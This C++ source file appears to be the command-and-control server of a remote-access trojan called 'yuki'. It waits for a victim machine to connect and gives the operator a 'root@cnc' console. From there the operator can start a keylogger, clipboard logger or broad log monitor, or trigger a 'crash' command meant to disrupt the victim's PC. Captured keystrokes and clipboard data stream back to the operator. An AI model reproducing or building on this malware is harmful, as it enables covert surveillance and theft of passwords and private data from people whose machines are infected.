#include "yuki_server.hpp"

server::server() {
    std::cout << "\x1b[2J\x1b[3J\x1b[H" << BLUE;
    std::cout << "\t                 _     _" << std::endl;
    std::cout << "\t                | |   (_)" << std::endl;
    std::cout << "\t   _   _  _   _ | | __ _" << std::endl;
    std::cout << "\t  | | | || | | || |/ /| |" << std::endl;
    std::cout << "\t  | |_| || |_| ||   < | |" << std::endl;
    std::cout << "\t   \\__, | \\__,_||_|\\_\\|_|" << std::endl;
    std::cout << "\t    __/ |" << std::endl;
    std::cout << "\t   |___/" << NC << std::endl;
    std::cout << GREEN << "\n\t\t[ ver 2.5 ]" << NC << std::endl;
    std::cout << "\nloading..." << std::endl;
}

server::~server() {
    close(connect);
    close(sockfd);
}

bool server::setup() {
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8080);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return false;

    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) return false;

    struct sockaddr_in get_addr;
    socklen_t len = sizeof(struct sockaddr_in);

    if (listen(sockfd, 1) < 0) {
        close(sockfd);
        return false;
    }

    connect = accept(sockfd, (struct sockaddr *)&get_addr, &len);
    return true;
}

int server::cmd(const char *str) {
    if (!strcmp(str, "pwd")) return 1;
    else if (!strcmp(str, "keylogger"))  return 1;
    else if (!strcmp(str, "cliplogger")) return 1;
    else if (!strcmp(str, "all_log"))    return 1;
    else if (!strcmp(str, "crash"))      return 1;
    else if (!strcmp(str, "!q"))         return 1;
    else if (!strcmp(str, "help")) {
        std::cout << "Command List" << std::endl;
        std::cout << "\tpwd        - view current directory" << std::endl;
        std::cout << "\tkeylogger  - get the characters you entered" << std::endl;
        std::cout << "\tcliplogger - clipboard monitoring" << std::endl;
        std::cout << "\tall_log    - monitor almost all logs" << std::endl;
        std::cout << "\tcrash      - makes pc go crazy" << std::endl;
        return 2;
    }
    else if (!strcmp(str, "")) return 2;
    return 0;
}

void server::keylog(int fd, char buf[]) {
    while (1) {
        recv(fd, buf, 4096, 0);
        std::cout << buf;
        memset(buf, 0, MAX*sizeof(buf[0]));
        buf[MAX] = {0};
    }
    return;
}

void server::cnc() {
    while (1) {
        if (setup()) break;
    }
    std::cout << GREEN << "\nConnection Successful" << NC << std::endl;

    while (1) {
        std::cout << "root@cnc:~$ ";
        fgets(send_buf, sizeof(send_buf), stdin);
        send_buf[strcspn(send_buf, "\r\n")] = 0;

        if (cmd(send_buf) == 2) continue;
        else if (cmd(send_buf) != 1) {
            std::cout << "not found!" << std::endl;
            continue;
        }

        send(connect, send_buf, sizeof(send_buf), 0);
        if (!strcmp(send_buf, "!q")) break;

        if (!strcmp(send_buf, "keylogger")) {
            std::cout << BLUE << "\nLogging started.\n" << NC << std::endl;
            keylog(connect, recv_buf);
            continue;
        }
        else if (!strcmp(send_buf, "cliplogger")) {
            std::cout << BLUE << "\nLogging started.\n" << NC << std::endl;
            keylog(connect, recv_buf);
            continue;
        }
        else if (!strcmp(send_buf, "all_log")) {
            std::cout << BLUE << "\nLogging started.\n" << NC << std::endl;
            keylog(connect, recv_buf);
            continue;
        }
        else if (!strcmp(send_buf, "crash")) {
            std::cout << BLUE << "\nMy pc was destroyed lol.\n" << NC << std::endl;
            break;
        }

        recv(connect, recv_buf, sizeof(recv_buf), 0);

        std::cout << recv_buf << std::endl;
        memset(recv_buf, 0, MAX*sizeof(recv_buf[0]));
    }
}